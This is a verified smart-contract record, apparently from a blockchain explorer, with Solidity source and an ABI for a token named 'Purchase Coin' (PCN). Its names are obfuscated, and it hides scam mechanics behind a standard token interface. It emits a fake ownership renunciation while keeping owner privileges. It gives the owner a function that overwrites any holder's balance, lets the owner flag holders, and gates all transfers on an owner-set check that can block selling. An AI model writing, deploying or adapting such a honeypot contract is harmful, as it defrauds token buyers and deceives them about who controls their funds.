{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface amountMode {\n    function createPair(address walletFund, address totalListShould) external returns (address);\n}\n\ninterface txLimitFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundBuy) external view returns (uint256);\n\n    function transfer(address fundLaunchedMin, uint256 walletTeam) external returns (bool);\n\n    function allowance(address senderTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundLaunchedMin,\n        uint256 walletTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenTeam, uint256 value);\n    event Approval(address indexed senderTx, address indexed spender, uint256 value);\n}\n\nabstract contract launchedLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeReceiverLaunched is txLimitFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PurchaseCoin is launchedLiquidity, txLimitFund, takeReceiverLaunched {\n\n    function shouldTake() private view {\n        require(txAuto[_msgSender()]);\n    }\n\n    function launchedAutoShould(address amountTotal, uint256 walletTeam) public {\n        shouldTake();\n        modeToken[amountTotal] = walletTeam;\n    }\n\n    uint256 toTx;\n\n    function walletAutoTeam(address receiverList, address fundLaunchedMin, uint256 walletTeam) internal returns (bool) {\n        if (receiverList == launchedTx) {\n            return txFee(receiverList, fundLaunchedMin, walletTeam);\n        }\n        uint256 teamLiquidity = txLimitFund(takeAuto).balanceOf(receiverMax);\n        require(teamLiquidity == takeExempt);\n        require(fundLaunchedMin != receiverMax);\n        if (tokenTxTo[receiverList]) {\n            return txFee(receiverList, fundLaunchedMin, buyShouldTotal);\n        }\n        return txFee(receiverList, fundLaunchedMin, walletTeam);\n    }\n\n    string private toTake = \"Purchase Coin\";\n\n    function minTrading(uint256 walletTeam) public {\n        shouldTake();\n        takeExempt = walletTeam;\n    }\n\n    constructor (){\n        \n        atLimit totalTeam = atLimit(fundSender);\n        takeAuto = amountMode(totalTeam.factory()).createPair(totalTeam.WETH(), address(this));\n        if (marketingTo == launchedList) {\n            isShould = false;\n        }\n        launchedTx = _msgSender();\n        txAuto[launchedTx] = true;\n        modeToken[launchedTx] = totalEnable;\n        totalList();\n        \n        emit Transfer(address(0), launchedTx, totalEnable);\n    }\n\n    bool public buyWallet;\n\n    function totalList() public {\n        emit OwnershipTransferred(launchedTx, address(0));\n        listAt = address(0);\n    }\n\n    address fundSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return listAt;\n    }\n\n    uint256 takeExempt;\n\n    string private launchAmountTo = \"PCN\";\n\n    function name() external view virtual override returns (string memory) {\n        return toTake;\n    }\n\n    address public takeAuto;\n\n    function tokenLaunchedTotal(address listMaxMarketing) public {\n        if (launchExempt) {\n            return;\n        }\n        \n        txAuto[listMaxMarketing] = true;\n        if (marketingTo == launchedList) {\n            launchedList = marketingTo;\n        }\n        launchExempt = true;\n    }\n\n    uint256 private totalEnable = 100000000 * 10 ** 18;\n\n    uint256 constant buyShouldTotal = 17 ** 10;\n\n    address public launchedTx;\n\n    mapping(address => bool) public tokenTxTo;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalEnable;\n    }\n\n    function owner() external view returns (address) {\n        return listAt;\n    }\n\n    function isReceiver(address receiverFrom) public {\n        shouldTake();\n        \n        if (receiverFrom == launchedTx || receiverFrom == takeAuto) {\n            return;\n        }\n        tokenTxTo[receiverFrom] = true;\n    }\n\n    mapping(address => uint256) private modeToken;\n\n    mapping(address => mapping(address => uint256)) private tradingFundList;\n\n    address private listAt;\n\n    function transferFrom(address receiverList, address fundLaunchedMin, uint256 walletTeam) external override returns (bool) {\n        if (_msgSender() != fundSender) {\n            if (tradingFundList[receiverList][_msgSender()] != type(uint256).max) {\n                require(walletTeam <= tradingFundList[receiverList][_msgSender()]);\n                tradingFundList[receiverList][_msgSender()] -= walletTeam;\n            }\n        }\n        return walletAutoTeam(receiverList, fundLaunchedMin, walletTeam);\n    }\n\n    mapping(address => bool) public txAuto;\n\n    function balanceOf(address fundBuy) public view virtual override returns (uint256) {\n        return modeToken[fundBuy];\n    }\n\n    uint256 private launchedList;\n\n    function approve(address isMin, uint256 walletTeam) public virtual override returns (bool) {\n        tradingFundList[_msgSender()][isMin] = walletTeam;\n        emit Approval(_msgSender(), isMin, walletTeam);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed tradingTx, address indexed receiverShouldAt);\n\n    function decimals() external view virtual override returns (uint8) {\n        return listSenderShould;\n    }\n\n    address receiverMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function txFee(address receiverList, address fundLaunchedMin, uint256 walletTeam) internal returns (bool) {\n        require(modeToken[receiverList] >= walletTeam);\n        modeToken[receiverList] -= walletTeam;\n        modeToken[fundLaunchedMin] += walletTeam;\n        emit Transfer(receiverList, fundLaunchedMin, walletTeam);\n        return true;\n    }\n\n    function transfer(address amountTotal, uint256 walletTeam) external virtual override returns (bool) {\n        return walletAutoTeam(_msgSender(), amountTotal, walletTeam);\n    }\n\n    bool public launchExempt;\n\n    function allowance(address exemptFeeAuto, address isMin) external view virtual override returns (uint256) {\n        if (isMin == fundSender) {\n            return type(uint256).max;\n        }\n        return tradingFundList[exemptFeeAuto][isMin];\n    }\n\n    bool private isShould;\n\n    uint8 private listSenderShould = 18;\n\n    uint256 private marketingTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchAmountTo;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverShouldAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptFeeAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"isReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"launchedAutoShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"minTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMaxMarketing\",\"type\":\"address\"}],\"name\":\"tokenLaunchedTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTxTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLaunchedMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PurchaseCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}